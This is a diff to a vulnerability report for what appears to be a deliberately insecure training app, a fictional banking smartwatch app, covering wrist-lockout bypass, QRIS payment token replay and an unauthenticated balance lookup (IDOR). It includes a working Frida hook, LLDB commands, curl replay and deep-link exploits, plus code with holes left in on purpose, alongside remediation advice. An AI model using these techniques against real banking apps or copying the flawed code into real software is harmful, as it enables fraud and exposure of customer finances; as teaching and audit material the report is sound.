@@ -16,7 +16,7 @@
    - [Scenario 4: High-Value (Rp 50.000.000) Out-of-Band 2FA Wire Transfer Hijack (V-AP04)](#scenario-4-high-value-rp-50000000-out-of-band-2fa-wire-transfer-hijack-v-ap04)
    - [Scenario 5: Sensor Wrist-Off Lockout Spoofing & Heart Rate Leak (V-AP05)](#scenario-5-sensor-wrist-off-lockout-spoofing--heart-rate-leak-v-ap05)
    - [Scenario 6: Contactless Dynamic SNAP QRIS Static Replay (V-AP06)](#scenario-6-contactless-dynamic-snap-qris-static-replay-v-ap06)
-   - [Scenario 7: Remote Balance Injection via Insecure WatchBridge (V-B01)](#scenario-7-remote-balance-injection-via-insecure-watchbridge-v-b01)
+   - [Scenario 7: Remote Balance Injection via Insecure WatchBridge & Standalone IDOR (V-B01 / V-AP07)](#scenario-7-remote-balance-injection-via-insecure-watchbridge--standalone-idor-v-b01--v-ap07)
    - [Scenario 8: ATM Cardless Cash-Out OTP Brute-Force & Race Condition (V-L04)](#scenario-8-atm-cardless-cash-out-otp-brute-force--race-condition-v-l04)
    - [Scenario 9: Emergency Wrist Card Kill-Switch Desynchronization (V-W09)](#scenario-9-emergency-wrist-card-kill-switch-desynchronization-v-w09)
    - [Scenario 10: Client-Side iOS Jailbreak Anti-Tamper Detection Bypass (V-07)](#scenario-10-client-side-ios-jailbreak-anti-tamper-detection-bypass-v-07)
@@ -466,26 +466,180 @@ Nexora Watch replicates a premier private digital banking workflow:
 ---
 
 ### Scenario 5: Sensor Wrist-Off Lockout Spoofing & Heart Rate Leak (V-AP05)
-- **Severity**: **MEDIUM** (`CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N` — Score: 5.3)
-- **Vulnerability Standard**: CWE-693 (Protection Mechanism Failure), CWE-200 (Information Exposure)
+- **Severity**: **HIGH** (`CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:L/SI:H/SA:N` — Score: 7.2)
+- **Vulnerability Standard**: CWE-693 (Protection Mechanism Failure), CWE-200 (Information Exposure), CWE-305 (Authentication Bypass by Primary Weakness), OWASP MASVS-AUTH-2
 - **Description**:
-  The off-wrist lockout check relies on an in-memory boolean flag `isWristAttached` that can be swizzled at runtime, keeping the stolen watch unlocked.
+  The Nexora OmniWear watch application relies on client-side photoplethysmography (PPG) and optical wrist sensor telemetry to detect whether the Apple Watch is worn on the user's wrist. When removed, the application should instantly lock down banking sessions (`WristLockoutView.swift`) and require biometric re-authentication or Quick-PIN.
+  However, the security check relies entirely on an in-memory boolean property `isWristAttached` and an Objective-C dynamic method `-[WristSensorManager isWristAttachedToBody]`. An attacker with physical access or a researcher utilizing LLDB or Frida over USB can swizzle `isWristAttachedToBody` to always return `true`, or patch the memory variable, completely defeating the wrist-off auto-lockout mechanism without knowing the PIN or having physical contact with skin.
+- **Root Cause Code**:
+  - [`ios/NexoraWatch/WristSensorManager.swift`](file:///ios/NexoraWatch/WristSensorManager.swift#L35-L48):
+    ```swift
+    public func triggerWristOff() {
+        if bypassActive {
+            isLockedDueToWristOff = false
+            return
+        }
+        isWristAttached = false
+        isLockedDueToWristOff = true
+    }
+    
+    @objc public dynamic func isWristAttachedToBody() -> Bool {
+        return bypassActive ? true : isWristAttached
+    }
+    ```
+- **Proof-of-Concept Exploit (Mac LLDB / Frida)**:
+  1. Method A: Frida Script (`scripts/frida_bypass_wrist.js`):
+     ```javascript
+     // frida -n NexoraWatch -l scripts/frida_bypass_wrist.js
+     if (ObjC.available) {
+         var wristClass = ObjC.classes.WristSensorManager;
+         if (wristClass) {
+             Interceptor.attach(wristClass["- isWristAttachedToBody"].implementation, {
+                 onLeave: function(retval) {
+                     console.log("[🚨 V-AP05 EXPLOIT] Swizzling isWristAttachedToBody -> TRUE");
+                     retval.replace(ptr(1));
+                 }
+             });
+         }
+     }
+     ```
+  2. Method B: LLDB Breakpoint Command (Mac Simulator or USB Device):
+     ```lldb
+     (lldb) breakpoint set -n "-[WristSensorManager isWristAttachedToBody]"
+     (lldb) breakpoint command add 1
+     > thread return 1
+     > continue
+     > DONE
+     ```
+  3. Interactive Lab Trigger:
+     - Open **Audit Lab -> P3 (Sensors & Anti-Tamper)**.
+     - Tap **V-AP05: Standalone LLDB/Frida Wrist Hook**.
+     - Notice `[V-AP05] Standalone Hook: isWristAttachedToBody=true ✓`. Remove watch or tap "Test Wrist Lock" — watch remains unlocked!
+- **Impact & Evidence**:
+  - The stolen smartwatch remains permanently unlocked in an authenticated banking session, allowing physical thieves or unauthorized persons to view balances, execute transfers, and issue cardless cash withdrawals without triggering biometric or PIN prompts.
+- **Enterprise Remediation**:
+  - Migrate off-wrist detection from high-level userland booleans to cryptographically signed Secure Enclave hardware assertions (`WKInterfaceDevice.current().isWristDetectEnabled`).
+  - Enforce hardware key invalidation in Keychain (`kSecAccessControlBiometryAny` or `kSecAccessControlDevicePasscode`) so that removing the device immediately wipes cryptographic decryption keys from Secure Enclave cache.
+- **Regulatory Non-Compliance**:
+  - **OJK POJK 11/POJK.03/2022 Pasal 25**: Kegagalan mekanisme proteksi otentikasi fisik pada perangkat bergerak (smartwatch).
+  - **PCI-DSS v4.0 Requirement 8.3.1**: Missing physical device presence re-authentication upon session detachment.
 
 ---
 
 ### Scenario 6: Contactless Dynamic SNAP QRIS Static Replay (V-AP06)
 - **Severity**: **HIGH** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:N/SC:L/SI:H/SA:N` — Score: 7.7)
-- **Vulnerability Standard**: CWE-294 (Authentication Bypass by Capture-replay)
+- **Vulnerability Standard**: CWE-294 (Authentication Bypass by Capture-replay), CWE-345 (Insufficient Verification of Data Authenticity), Bank Indonesia PADG No. 24/1/PADG/2022
 - **Description**:
-  The watch generates an EMVCo dynamic QRIS string containing a static transaction token `A016304E8A2`. The backend executes payment without checking timestamp freshness or cryptographic nonce.
+  Nexora OmniWear provides contactless dynamic SNAP QRIS payments directly from the Apple Watch face (`QRISPaymentView.swift`). The QR payload complies with the ASPI / Bank Indonesia EMVCo standard, containing National Merchant ID (`NMID`: `ID1020021189360`), currency IDR (`5303360`), and amount (`540575000`).
+  However, the generated QR code contains a static transaction token `A016304E8A2` with zero cryptographic nonce, missing timestamp validation, and no server-side replay cache. An attacker eavesdropping on NFC / optical BLE broadcasts, capturing the watch screen, or intercepting the cleartext direct HTTP request `/api/qris/checkout` can replay the QR string repeatedly, causing unauthorized repeated balance deductions.
+- **Root Cause Code**:
+  - Watch Client ([`ios/NexoraWatch/QRISPaymentView.swift`](file:///ios/NexoraWatch/QRISPaymentView.swift#L9-L10)):
+    ```swift
+    @State private var qrisString: String = "00020101021226610016ID.NEXORA.WWW01189360099800000000015204581253033605802ID5920NEXORA DIGITAL MERCH6007JAKARTA62070703A016304E8A2"
+    ```
+  - Backend Handler ([`backend/server.py`](file:///backend/server.py#L1250-L1285)):
+    ```python
+    @app.route('/api/qris/checkout', methods=['POST'])
+    def qris_checkout():
+        data = request.get_json() or {}
+        amount = float(data.get('amount', 75000.0))
+        # Accepts static qrPayload without checking nonce uniqueness or timestamp expiry
+        # Directly updates user balance and writes transaction row
+    ```
+- **Proof-of-Concept Exploit (Mac curl / Python)**:
+  1. Capture QR payload from watch or network proxy:
+     `00020101021226610016ID.NEXORA.WWW01189360099800000000015204581253033605802ID5920NEXORA DIGITAL MERCH6007JAKARTA62070703A016304E8A2`
+  2. Execute duplicate checkout replay from Mac terminal:
+     ```bash
+     curl -s -X POST http://127.0.0.1:5000/api/qris/checkout \
+       -H "Content-Type: application/json" \
+       -d '{
+         "amount": 75000.0,
+         "merchant": "NEXORA DIGITAL MERCH 001",
+         "qr_payload": "00020101021226610016ID.NEXORA.WWW01189360099800000000015204581253033605802ID5920NEXORA DIGITAL MERCH6007JAKARTA62070703A016304E8A2"
+       }' | jq .
+     ```
+  3. Interactive Lab Trigger:
+     - Open **SNAP QRIS** screen on Apple Watch.
+     - Tap **Exploit: Replay QRIS Token**.
+     - Notice `[V-AP06 EXPLOIT] Token Replay Accepted!`. Check SQLite database — balance is debited twice!
+- **Impact & SQLite Ledger Evidence**:
+  ```bash
+  python -c "import sqlite3; conn = sqlite3.connect('backend/nexora_vault.db'); cur = conn.cursor(); cur.execute('SELECT transaction_id, type, amount, description FROM transactions WHERE type=\"QRIS_PAYMENT\" ORDER BY timestamp DESC LIMIT 2'); print(cur.fetchall())"
+  ```
+  Output proves duplicate transactions recorded for identical QR tokens without rejection.
+- **Enterprise Remediation**:
+  - Enforce Bank Indonesia SNAP QRIS standard: Include a cryptographic epoch timestamp (Tag 54/62), dynamic one-time transaction nonce (UUIDv4), and asymmetric HMAC-SHA256 signature calculated with private key stored in Secure Enclave.
+  - Implement Redis atomic nonce validation (`SET nonce:value EX 60 NX`) on backend to reject replayed tokens within milliseconds.
+- **Regulatory Non-Compliance**:
+  - **Bank Indonesia PADG No. 24/1/PADG/2022 (SNAP QRIS)**: Kewajiban dynamic QR generation dengan validitas waktu terbatas (< 60 detik) dan proteksi anti-replay.
+  - **PCI-DSS v4.0 Requirement 6.2.4**: Ineffective replay protection on financial settlement interfaces.
 
 ---
 
-### Scenario 7: Remote Balance Injection via Insecure WatchBridge (V-B01)
-- **Severity**: **HIGH** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:H/VA:N/SC:L/SI:H/SA:N` — Score: 7.1)
-- **Vulnerability Standard**: CWE-345 (Insufficient Verification of Data Authenticity)
+### Scenario 7: Remote Balance Injection via Insecure WatchBridge & Standalone IDOR (V-B01 / V-AP07)
+- **Severity**: **HIGH** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:L/SI:H/SA:N` — Score: 8.6)
+- **Vulnerability Standard**: CWE-639 (Authorization Bypass Through User-Controlled Key / IDOR / BOLA), CWE-345 (Insufficient Verification of Data Authenticity), OWASP API1:2023 Broken Object Level Authorization
 - **Description**:
-  React Native Native Bridge (`WatchBridge.m` and `WatchBridge.swift`) exposes methods `sendMessageToWatch` and `updateWatchContext` without session token validation. Rogue JavaScript can force fake balances to the watch display.
+  The Nexora OmniWear watch ecosystem suffers from dual broken authorization and balance injection vulnerabilities:
+  1. **Standalone Wrist BOLA / IDOR (`V-AP07`)**: The watch client makes direct HTTP balance inquiries via `WatchNetworkManager.shared.checkBalance(accountNumber:)` to `/check_balance/<accountNumber>`. The endpoint performs zero authorization or ownership validation. Furthermore, the watch app registers custom URL scheme `nexorabank://account?num=<accountNumber>`. A researcher or local malicious app on Mac can trigger `xcrun simctl openurl booted "nexorabank://account?num=NX-7391048"` to bypass authentication and exfiltrate the live private banking balance of high-net-worth VIP customer Evelyn Sterling (`NX-7391048`, balance Rp 70.250.000).
+  2. **Insecure Companion WatchBridge Injection (`V-B01`)**: The iOS Native Module bridge (`WatchBridge.m` and `WatchBridge.swift`) exposes methods `sendMessageToWatch` and `updateWatchContext` directly to JavaScript without verifying caller authorization or cryptographically signing the payload. Rogue JavaScript running inside a compromised React Native bundle or webview can inject arbitrary financial balances (e.g. `Rp 9.999.999.000`) into the smartwatch display.
+- **Root Cause Code**:
+  - Deep Link Handler ([`ios/NexoraWatch/ContentView.swift`](file:///ios/NexoraWatch/ContentView.swift#L45-L58)):
+    ```swift
+    private func handleIncomingURL(_ url: URL) {
+        guard url.scheme == "nexorabank" else { return }
+        if let components = URLComponents(url: url, resolvingAgainstBaseURL: true),
+           let queryItems = components.queryItems {
+            for item in queryItems {
+                if item.name == "num", let targetAcct = item.value {
+                    InsecureStorage.shared.saveAccountNumber(targetAcct)
+                    isAuthenticated = true
+                    currentScreen = "balance"
+                }
+            }
+        }
+    }
+    ```
+  - Direct HTTP Endpoint ([`backend/server.py`](file:///backend/server.py#L420-L435)):
+    ```python
+    @app.route('/check_balance/<account_number>', methods=['GET'])
+    def check_balance(account_number):
+        # Vulnerability: Returns account balance without session cookie or JWT verification
+        cur.execute("SELECT balance, currency FROM users WHERE account_number = ?", (account_number,))
+        row = cur.fetchone()
+        return jsonify({"accountNumber": account_number, "balance": row[0], "currency": row[1]})
+    ```
+- **Proof-of-Concept Exploit (Standalone Mac Terminal & simctl)**:
+  1. Exploit A: Trigger Standalone Deep Link BOLA via `simctl`:
+     ```bash
+     xcrun simctl openurl booted "nexorabank://account?num=NX-7391048"
+     ```
+     *Result*: Watch instantly unlocks, bypasses Quick-PIN, and displays Evelyn Sterling's account `NX-7391048` with live balance `Rp 70.250.000`!
+  2. Exploit B: Direct API Curl Exfiltration from Mac:
+     ```bash
+     curl -s http://127.0.0.1:5000/check_balance/NX-7391048 | jq .
+     ```
+     Response:
+     ```json
+     {
+       "accountNumber": "NX-7391048",
+       "balance": 70250000.0,
+       "currency": "IDR"
+     }
+     ```
+  3. Interactive Lab Trigger:
+     - Open **Audit Lab -> P4 (Authentication & 2FA)**.
+     - Tap **V-AP07: Standalone BOLA (Evelyn Sterling)**.
+     - Console immediately outputs: `[V-AP07] BOLA Expose: NX-7391048 = Rp 70.250.000`.
+- **Impact & Evidence**:
+  - Full unauthorized reconnaissance and information disclosure across all banking customers. Attackers can enumerate account numbers (`NX-8492014`, `NX-7391048`, `NX-9201482`) and reconstruct customer balance ledgers with zero authentication.
+- **Enterprise Remediation**:
+  - Enforce mandatory JWT Bearer authentication on `/check_balance/<account_number>`, extracting caller identity strictly from validated token claims (`sub` / `account_id`) rather than path parameters.
+  - Require explicit authentication before handling incoming URL schemes in `ContentView.swift`.
+- **Regulatory Non-Compliance**:
+  - **OJK POJK 11/POJK.03/2022 Pasal 25 Ayat (1)**: Pelanggaran kerahasiaan data nasabah akibat ketiadaan otorisasi pada antarmuka pemrograman aplikasi (API).
+  - **PCI-DSS v4.0 Requirement 6.2.4 & Requirement 7.2.1**: Broken Object-Level Authorization (BOLA) exposing customer financial records.
 
 ---
 
